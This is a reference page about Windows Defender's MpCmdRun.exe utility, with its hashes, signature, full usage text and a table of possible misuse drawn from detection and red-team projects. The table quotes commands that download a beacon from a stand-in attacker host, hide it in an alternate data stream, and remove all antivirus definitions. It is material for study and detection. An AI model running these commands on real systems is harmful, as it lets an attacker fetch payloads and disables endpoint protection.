---
title: MpCmdRun.exe | Microsoft Malware Protection Command Line Utility
excerpt: What is MpCmdRun.exe?
---

# MpCmdRun.exe 

* File Path: `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2007.8-0\X86\MpCmdRun.exe`
* Description: Microsoft Malware Protection Command Line Utility

## Hashes

Type | Hash
-- | --
MD5 | `3E41E1307F5ED17BAE3D2C8B23C6356D`
SHA1 | `C9FA045B45612B891BD1E9E150B96FBE550A8C1C`
SHA256 | `3D9A2C370C77A665CED8AAB4864892300259081B3E0ACF5879A9B605F4A46A0B`
SHA384 | `F22AD92EE0A129EC311EEA707C5BC54246B9BBDF0C6F81EA0BE79EEE563339512A178DC8891A73A0510FDE68FB73FE6F`
SHA512 | `050E5AE852918A9A6402288E2E578AF73740B06B203F14D431779FEAC207A02E372611572D43B01127F6824A343EABFAE7931FE2E5544FBADB26708E28FBA862`
SSDEEP | `6144:Beh9Bp1xwfjxSbkoTUc8PgPoP9YZJD8wg8v4Bu6Mw4V1dNK//VK:vLxKkoTSVYnD8wg8vKu6MV1dm/Q`
IMP | `1EEDCE690720909485EC16A7AB6FAA87`
PESHA1 | `DC01744B17FBCF97DFEDDAE7A05D382C97B3FBF3`
PE256 | `3E01ED4EBD62D0B52AE8D70E915354A9F93037F7F9937EF9DB88AA05DEC76315`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft Antimalware Service Command Line Utility (c) 2006-2018 Microsoft Corp
Use this tool to automate and troubleshoot Microsoft Antimalware Service

Usage:
MpCmdRun.exe [command] [-options]

Command Description
   -? / -h                                    Displays all available options
                                              for this tool
   -Scan [-ScanType #] [-File <path> [-DisableRemediation] [-BootSectorScan] [-CpuThrottling]]
         [-Timeout <days>]
         [-Cancel]
         [-ReturnHR]
                                              Scans for malicious software
   -Trace [-Grouping #] [-Level #]            Starts diagnostic tracing
   -GetFiles [-SupportLogLocation <path>]     Collects support information
   -GetFilesDiagTrack                         Same as Getfiles but outputs to 
                                              temporary DiagTrack folder 
   -RemoveDefinitions [-All]                  Restores the installed
                                              signature definitions
                                              to a previous backup copy or to
                                              the original default set of
                                              signatures
                      [-Engine]               Restore the installed engine to
                                              the previous version saved
                      [-DynamicSignatures]    Removes only the dynamically
                                              downloaded signatures
   -SignatureUpdate [-UNC | -MMPC]            Checks for new definition updates
   -Restore  [-ListAll | [[-Name <name>] [-All] | [-FilePath <filePath>]] [-Path <path>]]  Restore or list
                                                               quarantined item(s)
   -AddDynamicSignature [-Path]               Loads a dynamic signature
   -ListAllDynamicSignatures                  List the loaded dynamic signatures
   -RemoveDynamicSignature [-SignatureSetID]  Removes a dynamic signature
   -CheckExclusion -path <path>               Checks whether path is excluded
   -DownloadFile -URL <url> -path <path>      Downloads a file from the given URL
                                              to the location given in path. Path
                                              should also have the file name in it.

Additional Information:

Support information will be in the following directory:
C:\ProgramData\Microsoft\Windows Defender\Support

   -Scan [-ScanType value]
        0  Default, according to your configuration
        1  Quick scan
        2  Full system scan
        3  File and directory custom scan

           [-File <path>]
                Indicates the file or directory  to be scanned, only valid for custom scan.

           [-DisableRemediation]
                This option is valid only for custom scan.
                When specified:
                  - File exclusions are ignored.
                  - Archive files are scanned.
                  - Actions are not applied after detection.
                  - Event log entries are not written after detection.
                  - Detections from the custom scan are not displayed in the user interface.
                  - The console output will show the list of detections from the custom scan.

           [-BootSectorScan]
                Enables boot sector scanning; only valid for custom scan.

           [-Timeout <days>]
                Timeout in days; maximum value is 30.
                If this parameter is not specified, default value is 7 days for full scan and 1 day for all other scans.

           [-Cancel]
                Try to cancel any ongoing quick or full scan.

           [-CpuThrottling]
                When specified:
                  - Will ensure that the scan obeys the CPU throttling as defined in the policy (Default 50).

           [-ReturnHR]
                Instead of returning the default 0 or 2 values, return the actual HRESULT of the scan command.

      [DEFAULT]Return code is
      0    if no malware is found or malware is successfully remediated and no additional user action is required
      2    if malware is found and not remediated or additional user action is required to complete remediation or there is error in scanning.  Please check History for more information.
      OR
      HRESULT of the scan command if -ReturnHR was specified

   -Trace [-Grouping value] [-Level value]
        Begins tracing Microsoft Antimalware Service's actions.
        You can specify the components for which tracing is enabled and
        how much information is recorded.
        If no component is specified, all the components will be logged.
        If no level is specified, the Error, Warning and Informational levels
        will be logged. The data will be stored in the support directory
        as a file having the current timestamp in its name and bearing
        the extension BIN.

        [-Grouping]
        0x1    Service
        0x2    Malware Protection Engine
        0x4    User Interface
        0x8    Real-Time Protection
        0x10   Scheduled actions
        0x20   WMI
        0x40   NIS/GAPA
        0x80   Windows Security Center
        0x100  DLP external

        [-Level]
        0x1    Errors
        0x2    Warnings
        0x4    Informational messages
        0x8    Function calls
        0x10   Verbose
        0x20   Performance

   -CaptureNetworkTrace -path <path>
       Captures all the network input into the Network Protection service and 
       saves it to a file at <path>. Supply an empty path to stop tracing
       Note: The specified path must be writable by LocalService
       ex: C:\Users\Public\Downloads 

   -GetFiles
        Gathers the following log files and packages them together in a 
        compressed file in the support directory

        - Any trace files from Microsoft Antimalware Service
        - The Windows Update history log
        - All Microsoft Antimalware Service events from the System event log
        - All relevant Microsoft Antimalware Service registry locations
        - The log file of this tool
        - The log file of the signature update helper tool

        [-SupportLogLocation <path>]
        Copies the support logs to the specified <path>. If <path> is not specified,
        support logs will be copied to the location specified in the SupportLogLocation Configuration.

   -GetFilesDiagTrack
        Same as GetFiles, but outputs the CAB file to the temp DiagTrack 
        directory

   -RemoveDefinitions
        Restores the last set of signature definitions

        [-Engine]
        Restores the last saved engine
        Use this option to restore the previous engine.

        [-All]
        Removes any installed signature and engine files. Use this 
        option if you have difficulties trying to update signatures.

        [-DynamicSignatures]
        Removes all Dynamic Signatures. 

   -SignatureUpdate
        Checks for new definition updates

        [-UNC [-Path <path>]]
        Performs update directly from UNC file share specified in <path>
        If -Path is not specified, update will be performed directly from the
             preconfigured UNC location

        [-MMPC]
        Performs update directly from Microsoft Malware Protection Center

   -Restore
        [-ListAll]
        List all items that were quarantined

        [-Name <name>]
        Restores the most recently quarantined item based on threat name
        One Threat can map to more than one file

        [-All]
        Restores all the quarantined items based on name

        [-FilePath <filePath>]
        Restores quarantined item based on file path

        [-Path]
        Specify the path where the quarantined items will be restored.
        If not specified, the item will be restored to the original path.
   -AddDynamicSignature -Path <path> 
        Adds a Dynamic Signature specified by <path>

   -ListAllDynamicSignatures
        Lists SignatureSet ID's of all Dynamic Signatures added to the client
        via MAPS and MPCMDRUN -AddDynamicSignature

   -RemoveDynamicSignature -SignatureSetID <SignatureSetID> 
        Removes a Dynamic Signature specified by <SignatureSetID>

   -CheckExclusion -path <path>
        Checks whether <path> is excluded. It can be either a path, or a file.


```

### Loaded Modules:

Path |
-- |
C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2007.8-0\X86\MpCmdRun.exe |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\wow64.dll |
C:\Windows\System32\wow64cpu.dll |
C:\Windows\System32\wow64win.dll |


## Signature

* Status: Signature verified.
* Serial: `330000024BB2230A43CD03636200000000024B`
* Thumbprint: `50AFF9A191126B5BAD57B29846F3B68D550758CA`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows Publisher, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: MpCmdRun.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 4.18.2007.8 (WinBuild.160101.0800)
* Product Version: 4.18.2007.8
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/69
* VirusTotal Link: https://www.virustotal.com/gui/file/3d9a2c370c77a665ced8aab4864892300259081b3e0acf5879a9b605f4a46a0b/detection/


## Possible Misuse

*The following table contains possible examples of `MpCmdRun.exe` being misused. While `MpCmdRun.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_meterpreter_or_cobaltstrike_getsystem_service_start.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_meterpreter_or_cobaltstrike_getsystem_service_start.yml) | `CommandLine\|contains: 'MpCmdRun'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mpcmdrun_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_mpcmdrun_download.yml) | `- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mpcmdrun_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_mpcmdrun_download.yml) | `- CommandLine\|contains: 'MpCmdRun.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `Name: MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\nicefile.txt:evil.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: MpCmdRun storing data into alternate data streams.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: MpCmdRun getting a file from a remote machine or the internet that is not expected.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [MpCmdRun.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml) | `- IOC: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log` | 
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `.`MpCmdRun.exe`` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #13: Download a File with Windows Defender MpCmdRun.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #13: Download a File with Windows Defender MpCmdRun.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #13 - Download a File with Windows Defender MpCmdRun.exe](#atomic-test-13---download-a-file-with-windows-defender-mpcmdrunexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #13 - Download a File with Windows Defender MpCmdRun.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | del %temp%\MpCmdRun.log >nul 2>&1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md) | "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_golddragon.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_golddragon.yar) | $s7 = "MpCmdRun.dll" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


